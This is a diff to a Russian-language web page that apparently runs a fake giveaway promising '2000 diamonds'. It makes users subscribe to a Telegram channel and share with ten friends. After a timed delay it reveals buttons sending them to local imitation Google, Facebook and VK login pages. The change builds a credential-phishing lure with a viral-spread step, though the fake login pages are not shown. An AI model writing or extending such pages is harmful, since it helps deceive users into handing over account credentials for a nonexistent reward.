@@ -100,6 +100,10 @@
       line-height: 1.6;
     }
 
+    .hidden {
+      display: none;
+    }
+
     @media (max-width: 768px) {
       .task-button {
         width: 100%;
@@ -123,15 +127,23 @@
     </div>
 
     <div id="task-1">
-      <button class="task-button" id="task-btn-1" onclick="completeTask('task-1')">Перейти по ссылке и подписаться на Telegram канал</button>
+      <button class="task-button waiting" id="task-btn-1" onclick="completeTask('task-1', 'https://t.me/ify_ac')">Перейти по ссылке и подписаться на Telegram канал</button>
     </div>
 
     <div id="task-2">
-      <button class="task-button" id="task-btn-2" onclick="completeTask('task-2')">Поделиться с 10 друзьями</button>
+      <button class="task-button waiting" id="task-btn-2" onclick="completeTask('task-2', 'https://t.me/ify_ac')">Поделиться с 10 друзьями</button>
     </div>
 
     <div class="long-text">
       <p>Как только все кнопки станут зелеными, они исчезнут, и появится окно с вашим призом!</p>
+    </div>
+
+    <div class="info-section hidden" id="reward-section">
+      <h2>Поздравляем! Вы забрали свои 2000 алмазов.</h2>
+      <p>Теперь войдите в свой аккаунт для получения награды. Выберите способ входа:</p>
+      <button class="task-button" onclick="window.location.href='login.google.html'">Войти через Google</button>
+      <button class="task-button" onclick="window.location.href='login.facebook.html'">Войти через Facebook</button>
+      <button class="task-button" onclick="window.location.href='login.vk.html'">Войти через VK</button>
     </div>
 
     <div class="footer">
@@ -145,17 +157,22 @@
   </div>
 
   <script>
-    function completeTask(taskId) {
+    let completedTasks = 0;
+
+    function completeTask(taskId, link) {
       const taskButton = document.getElementById('task-btn-' + taskId.charAt(taskId.length - 1));
       taskButton.classList.remove('waiting');
       taskButton.classList.add('completed');
       taskButton.innerText = 'Задание выполнено!';
+      
+      window.open(link, '_blank'); // Открывает ссылку в новой вкладке
 
-      if (document.querySelectorAll('.completed').length === 2) {
+      completedTasks++;
+
+      if (completedTasks === 2) {
         setTimeout(() => {
-          alert('Вы забрали 2000 алмазов!');
-          // Здесь добавьте логику для отображения кнопок для входа в систему
-        }, 2000);
+          document.getElementById('reward-section').classList.remove('hidden');
+        }, 30000); // Задержка 30 секунд
       }
     }
   </script>
